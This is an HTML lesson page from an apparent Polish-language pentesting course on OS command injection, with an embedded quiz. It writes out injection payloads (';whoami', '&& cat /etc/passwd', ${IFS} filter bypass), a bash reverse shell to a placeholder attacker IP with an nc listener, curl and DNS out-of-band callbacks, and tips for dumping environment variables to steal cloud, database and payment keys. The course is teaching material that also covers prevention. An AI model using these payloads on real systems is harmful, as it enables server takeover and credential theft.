<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lekcja 11: OS Command Injection - Kurs Pentestera</title>

    <link rel="stylesheet" href="style.css">

    <style>
        /* Akcent: Terminal Green (Matrix/Shell) */
        :root {
            --accent: #00ff00;
            --accent-glow: rgba(0, 255, 0, 0.3);
        }

        .cmd-prompt {
            color: #00ff00;
            font-family: monospace;
            font-weight: bold;
        }

        .cmd-input {
            color: #fff;
        }
    </style>
</head>

<body>

    <div class="container">
        <header>
            <h1>OS COMMAND INJECTION</h1>
            <p>MODU≈Å 11: Przejƒôcie terminala, Operatory i Wyciek Zmiennych ≈örodowiskowych</p>
        </header>

        <!-- 1. DEFINICJA -->
        <section>
            <h2>> SYSTEM SHELL ACCESS</h2>
            <p>To "≈õwiƒôty graal" atak√≥w. Wystƒôpuje, gdy aplikacja webowa przekazuje dane u≈ºytkownika bezpo≈õrednio do
                pow≈Çoki systemowej (bash, sh, cmd.exe) bez filtracji.</p>

            <div class="card">
                <h3>ANATOMIA ATAKU</h3>
                <p>Wyobra≈∫ sobie narzƒôdzie "Sprawd≈∫ status serwera" (Ping).</p>
                <div style="background:#000; padding:15px; border:1px solid #333; font-family:monospace;">
                    <span class="comment"># Kod backendu (uproszczony Python):</span><br>
                    os.system("ping -c 1 " + user_input)
                </div>

                <p>Je≈õli wpiszesz <code>8.8.8.8</code>, serwer wykona:<br>
                    <code>ping -c 1 8.8.8.8</code>
                </p>

                <p>Ale je≈õli wpiszesz <code>8.8.8.8; whoami</code>, serwer wykona:<br>
                    <code>ping -c 1 8.8.8.8; <span class="highlight">whoami</span></code>
                </p>

                <p><strong>Efekt:</strong> Serwer odpowie wynikiem pingu ORAZ nazwƒÖ u≈ºytkownika systemowego (np.
                    <code>www-data</code> lub <code>root</code>).</p>
            </div>
        </section>

        <!-- 2. OPERATORY -->
        <section>
            <h2>> S≈ÅOWNIK OPERATOR√ìW</h2>
            <p>Aby "dokleiƒá" swoje polecenie, musisz znaƒá znaki specjalne terminala.</p>

            <div class="card">
                <table>
                    <tr>
                        <th>Operator</th>
                        <th>Znaczenie (Linux/Unix)</th>
                    </tr>
                    <tr>
                        <td><code>;</code></td>
                        <td><strong>Separator sekwencyjny.</strong> "Wykonaj to, a potem tamto". (Dzia≈Ça nawet jak
                            pierwsze polecenie zwr√≥ci b≈ÇƒÖd).</td>
                    </tr>
                    <tr>
                        <td><code>&</code> lub <code>&&</code></td>
                        <td><strong>Uruchom w tle / AND.</strong> <code>cmd1 && cmd2</code> wykonuje cmd2 tylko je≈õli
                            cmd1 siƒô uda.</td>
                    </tr>
                    <tr>
                        <td><code>|</code> lub <code>||</code></td>
                        <td><strong>Pipe / OR.</strong> <code>|</code> przekazuje wynik jednego polecenia do drugiego.
                            <code>||</code> wykonuje drugie, je≈õli pierwsze zawiedzie.</td>
                    </tr>
                    <tr>
                        <td><code>$()</code> lub <code>``</code></td>
                        <td><strong>Command Substitution.</strong> Wynik polecenia wstawiany jest w miejsce tekstu. Np.
                            <code>ping $(whoami).hacker.com</code>.</td>
                    </tr>
                </table>
            </div>
        </section>

        <!-- 3. CELE I ENV -->
        <section>
            <h2>> CO KRADNIEMY? (IMPACT)</h2>
            <p>Masz RCE (Remote Code Execution). Co teraz?</p>

            <div class="card">
                <h3>1. ENVIRONMENT VARIABLES LEAKAGE üíé</h3>
                <p>W nowoczesnych aplikacjach (Docker, Kubernetes, Node.js) najwa≈ºniejsze sekrety NIE sƒÖ w plikach
                    konfiguracyjnych, ale w <strong>zmiennych ≈õrodowiskowych</strong>.</p>
                <p><strong>Komendy:</strong> <code>printenv</code>, <code>env</code>, <code>set</code> (Windows).</p>
                <p><strong>Co tam znajdziesz?</strong></p>
                <ul>
                    <li><code>AWS_ACCESS_KEY_ID</code> (Klucze do chmury)</li>
                    <li><code>DB_PASSWORD</code> (Has≈Ço do bazy)</li>
                    <li><code>STRIPE_API_KEY</code> (P≈Çatno≈õci)</li>
                </ul>
                <p class="comment">// To czƒôsto szybsza droga do przejƒôcia firmy ni≈º szukanie plik√≥w konfiguracyjnych.
                </p>
            </div>

            <div class="card">
                <h3>2. REVERSE SHELL (Pe≈Çna kontrola)</h3>
                <p>Zamiast wpisywaƒá komendy w URL, zmuszasz serwer, by po≈ÇƒÖczy≈Ç siƒô z Twoim terminalem.</p>
                <p><strong>AtakujƒÖcy (nas≈Çuch):</strong> <code>nc -lvnp 4444</code></p>
                <p><strong>Ofiara (Payload):</strong> <code>bash -i >& /dev/tcp/ATAKUJACY_IP/4444 0>&1</code></p>
                <p><strong>Efekt:</strong> Dostajesz interaktywnƒÖ konsolƒô serwera u siebie.</p>
            </div>
        </section>

        <!-- 4. BLIND RCE -->
        <section>
            <h2>> BLIND COMMAND INJECTION</h2>
            <p>Co je≈õli serwer wykonuje komendƒô, ale nie wy≈õwietla wyniku na stronie?</p>

            <div class="card">
                <ul>
                    <li><strong>Time-Based:</strong> Wpisujesz <code>; sleep 10</code>. Je≈õli strona ≈Çaduje siƒô 10
                        sekund d≈Çu≈ºej -> Masz RCE.</li>
                    <li><strong>Out-of-Band (OAST):</strong> Wpisujesz <code>; curl http://twoj-serwer.com</code>. Je≈õli
                        w logach swojego serwera zobaczysz po≈ÇƒÖczenie -> Masz RCE.</li>
                </ul>
            </div>
        </section>

        <!-- CHECKLIST -->
        <section>
            <h2>CHECKLISTA / RED FLAGS</h2>
            <div class="card checklist-card">
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Narzƒôdzia administracyjne:</strong> Funkcje typu "Ping", "Traceroute", "Check DNS",
                        "ImageMagick Convert". To klasyczne punkty wej≈õcia.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>PDF Generators:</strong> Czƒôsto pod spodem u≈ºywajƒÖ narzƒôdzi systemowych (np.
                        `wkhtmltopdf`), do kt√≥rych mo≈ºna "dokleiƒá" parametry.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>.env i Environment:</strong> Je≈õli masz RCE, pierwsza komenda to `env` lub `printenv`.
                        Tam le≈ºƒÖ klucze do kr√≥lestwa.</div>
                </div>
            </div>
        </section>

        <!-- QUIZ -->
        <section id="quiz-section">
            <h2>üéì WERYFIKACJA WIEDZY</h2>
            <div id="quiz-container"></div>
        </section>

        <footer>
            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Modu≈Ç 11</p>
        </footer>
    </div>

    <!-- DANE DO QUIZU -->
    <script>
        const quizData = [
            {
                question: "Czym jest OS Command Injection?",
                options: [
                    "Wstrzykniƒôciem kodu SQL do bazy danych.",
                    "B≈Çƒôdem pozwalajƒÖcym na wykonanie polece≈Ñ systemowych (shell) na serwerze ofiary.",
                    "Zdalnym restartem przeglƒÖdarki.",
                    "Nadpisaniem plik√≥w CSS."
                ],
                correct: 1,
                explanation: "To b≈ÇƒÖd w kodzie backendu, kt√≥ry przekazuje dane u≈ºytkownika bezpo≈õrednio do funkcji systemowych (np. exec, system, shell_exec)."
            },
            {
                question: "Co robi operator ≈õrednika ( ; ) w terminalu Linux/Unix?",
                options: [
                    "Ko≈Ñczy liniƒô kodu.",
                    "Pozwala wykonaƒá drugie polecenie niezale≈ºnie od wyniku pierwszego (separator polece≈Ñ).",
                    "Jest znakiem komentarza.",
                    "S≈Çu≈ºy do ≈ÇƒÖczenia string√≥w."
                ],
                correct: 1,
                explanation: "Dziƒôki ≈õrednikowi mo≈ºesz napisaƒá `prawdziwa_komenda; twoja_z≈Ço≈õliwa_komenda`. Serwer wykona obie po kolei."
            },
            {
                type: "scenario",
                question: "Uzyska≈Çe≈õ RCE na serwerze z aplikacjƒÖ w kontenerze Docker. JakƒÖ komendƒô wpiszesz jako pierwszƒÖ, aby szybko znale≈∫ƒá klucze API i has≈Ça?",
                options: [
                    "ls -la",
                    "whoami",
                    "printenv (lub env)",
                    "ping google.com"
                ],
                correct: 2,
                explanation: "W ≈õrodowiskach chmurowych/kontenerowych (12-factor app) sekrety sƒÖ przekazywane przez zmienne ≈õrodowiskowe. `printenv` wy≈õwietli je wszystkie w formacie tekstowym."
            },
            {
                question: "Na czym polega 'Blind OS Command Injection'?",
                options: [
                    "Serwer wykonuje komendƒô, ale nie zwraca jej wyniku na stronie www.",
                    "Serwer nie wykonuje komendy.",
                    "AtakujƒÖcy nie widzi ekranu.",
                    "Komendy sƒÖ szyfrowane."
                ],
                correct: 0,
                explanation: "Wymaga to sprytu. Musisz u≈ºyƒá op√≥≈∫nie≈Ñ czasowych (`sleep`) lub po≈ÇƒÖcze≈Ñ zwrotnych (`curl`), aby potwierdziƒá, ≈ºe komenda zadzia≈Ça≈Ça."
            },
            {
                question: "Co to jest Reverse Shell?",
                options: [
                    "Pow≈Çoka graficzna systemu Windows.",
                    "Technika, w kt√≥rej to serwer ofiary ≈ÇƒÖczy siƒô z komputerem atakujƒÖcego, udostƒôpniajƒÖc mu interaktywny terminal.",
                    "Skrypt do odwracania kolor√≥w w terminalu.",
                    "Ochrona przed wirusami."
                ],
                correct: 1,
                explanation: "Firewalle czƒôsto blokujƒÖ po≈ÇƒÖczenia przychodzƒÖce (Bind Shell), ale przepuszczajƒÖ wychodzƒÖce. Reverse Shell omija ten problem - serwer 'dzwoni do domu' (do hakera)."
            },
            {
                type: "scenario",
                question: "Widzisz pole 'Podaj IP do sprawdzenia'. Wpisujesz: '127.0.0.1 && cat /etc/passwd'. Co oznacza operator &&?",
                options: [
                    "Wykonaj drugie polecenie tylko wtedy, gdy pierwsze zako≈Ñczy siƒô sukcesem.",
                    "Wykonaj drugie polecenie w tle.",
                    "Przeka≈º wynik pierwszego polecenia do drugiego.",
                    "To b≈ÇƒÖd sk≈Çadni."
                ],
                correct: 0,
                explanation: "Operator AND (&&). Je≈õli ping siƒô uda (zwr√≥ci 0), wykonaj cat. Je≈õli ping siƒô nie uda, cat nie zostanie wykonany."
            },
            {
                question: "Jaka funkcja w PHP jest znanym wektorem Command Injection?",
                options: [
                    "echo()",
                    "system() / shell_exec() / passthru()",
                    "include()",
                    "strlen()"
                ],
                correct: 1,
                explanation: "Te funkcje s≈Çu≈ºƒÖ do wywo≈Çywania program√≥w systemowych. Je≈õli trafiƒÖ do nich nieprzefiltrowane dane u≈ºytkownika - gra sko≈Ñczona."
            },
            {
                question: "Dlaczego Command Injection jest zazwyczaj gro≈∫niejsze ni≈º SQL Injection?",
                options: [
                    "Nie jest gro≈∫niejsze.",
                    "Bo RCE daje pe≈ÇnƒÖ kontrolƒô nad serwerem (systemem operacyjnym), a SQLi zazwyczaj ogranicza siƒô 'tylko' do bazy danych (choƒá z bazy czasem da siƒô zrobiƒá RCE).",
                    "Bo SQLi jest trudne do wykrycia.",
                    "Bo RCE dzia≈Ça tylko na Windowsie."
                ],
                correct: 1,
                explanation: "MajƒÖc RCE, mo≈ºesz czytaƒá pliki, instalowaƒá rootkity, skanowaƒá sieƒá wewnƒôtrznƒÖ, kopaƒá kryptowaluty i atakowaƒá inne serwery. To 'Game Over'."
            },
            {
                type: "scenario",
                question: "Aplikacja u≈ºywa czarnej listy i blokuje spacje. Jak mo≈ºesz to obej≈õƒá w systemie Linux?",
                options: [
                    "Nie da siƒô.",
                    "U≈ºyƒá znaku przekierowania wej≈õcia '<' lub zmiennej ${IFS} (Internal Field Separator).",
                    "Wpisaƒá spacjƒô dwa razy.",
                    "U≈ºyƒá tabulatora (nie zadzia≈Ça w URL)."
                ],
                correct: 1,
                explanation: "W Bashu `cat${IFS}/etc/passwd` zadzia≈Ça tak samo jak `cat /etc/passwd`. To klasyczna technika omijania WAF (Web Application Firewall)."
            },
            {
                question: "Jaki jest najskuteczniejszy spos√≥b zapobiegania Command Injection?",
                options: [
                    "Usuwanie ≈õrednik√≥w z inputu.",
                    "Unikanie wywo≈Çywania komend systemowych. U≈ºywanie wbudowanych bibliotek jƒôzyka (np. biblioteka do przetwarzania obraz√≥w zamiast wywo≈Çywania ImageMagick przez shell).",
                    "Uruchamianie serwera jako root.",
                    "Instalacja antywirusa."
                ],
                correct: 1,
                explanation: "Je≈õli nie musisz u≈ºywaƒá shella - nie u≈ºywaj go. Je≈õli musisz - u≈ºywaj funkcji, kt√≥re przyjmujƒÖ argumenty jako listƒô/tablicƒô, a nie jako jeden sklejony ciƒÖg znak√≥w."
            }
        ];
    </script>

    <script src="quiz.js"></script>

</body>

</html>